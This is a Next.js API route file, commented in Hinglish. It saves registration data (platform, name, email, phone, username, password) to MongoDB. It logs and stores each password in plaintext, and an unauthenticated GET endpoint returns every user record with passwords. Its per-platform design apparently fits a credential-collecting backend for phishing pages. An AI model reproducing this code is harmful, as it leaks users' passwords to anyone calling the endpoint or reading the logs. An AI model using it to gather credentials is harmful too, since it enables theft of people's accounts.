import { NextRequest, NextResponse } from "next/server";
import { connectDB, User } from "@/lib/mongodb";

// ⚠️ SAVE ONLY — register pe sirf data save hota hai

export async function POST(req: NextRequest) {
  try {
    await connectDB();

    const body = await req.json();
    const { platform, firstName, lastName, email, phone, username, password } = body;

    console.log(`\n📩 [REGISTER-SAVE] Platform: ${platform}`);
    console.log(`   Name     : ${firstName || ""} ${lastName || ""}`);
    console.log(`   Email    : ${email || "—"}`);
    console.log(`   Phone    : ${phone || "—"}`);
    console.log(`   Username : ${username || "—"}`);
    console.log(`   Password : ${password}`);

    if (!password) {
      return NextResponse.json({ message: "Password required hai." }, { status: 400 });
    }

    // Sirf save — koi duplicate check nahi
    const user = new User({
      platform:  platform  || "unknown",
      firstName: firstName || "",
      lastName:  lastName  || "",
      email:     email     || "",
      phone:     phone     || "",
      username:  username  || "",
      password:  password,
    });

    await user.save();

    console.log("✅ [REGISTER-SAVE] Saved! ID:", user._id);

    return NextResponse.json(
      { message: "Account created!", firstName: firstName || username || email || phone },
      { status: 201 }
    );

  } catch (err: any) {
    console.error("🔴 [REGISTER-SAVE] Error:", err.message);
    return NextResponse.json({ message: "Server error: " + err.message }, { status: 500 });
  }
}

// GET — saare users dekho (testing ke liye)
export async function GET() {
  try {
    await connectDB();
    const users = await User.find({}, "-__v").lean();
    console.log(`📋 [GET] Total users in DB: ${users.length}`);
    return NextResponse.json(users, { status: 200 });
  } catch (err: any) {
    return NextResponse.json({ message: "Error: " + err.message }, { status: 500 });
  }
}